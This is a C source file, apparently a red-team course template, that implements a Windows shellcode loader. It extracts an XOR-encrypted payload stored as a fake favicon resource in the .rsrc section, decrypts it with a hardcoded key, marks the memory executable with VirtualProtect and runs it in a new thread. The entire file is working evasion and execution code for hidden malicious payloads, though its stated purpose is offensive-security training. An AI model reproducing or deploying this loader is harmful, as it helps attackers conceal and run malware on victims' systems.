/*

 Red Team Operator course code template
 storing payload in .rsrc section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resource.h"
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldProtect = 0;
    HGLOBAL resHandle = NULL;
    HRSRC res;
    
    unsigned char* payload;
    unsigned int payload_len;
    char key[] = "mysecretkeee";

    // Extract payload from resources section
    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = LoadResource(NULL, res);
    payload = (unsigned char*) LockResource(resHandle);
    payload_len = SizeofResource(NULL, res);
    
    // Allocate some memory buffer for payload
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload);
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

    // Copy payload to new memory buffer
    RtlMoveMemory(exec_mem, payload, payload_len);

    // Decrypt (DeXOR) the payload
    XOR((char*)exec_mem, payload_len, key, sizeof(key));

    // Make the buffer executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldProtect);

    printf("\nHit me!\n");
    getchar();

    // Launch the payload
    if ( rv != 0 ) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
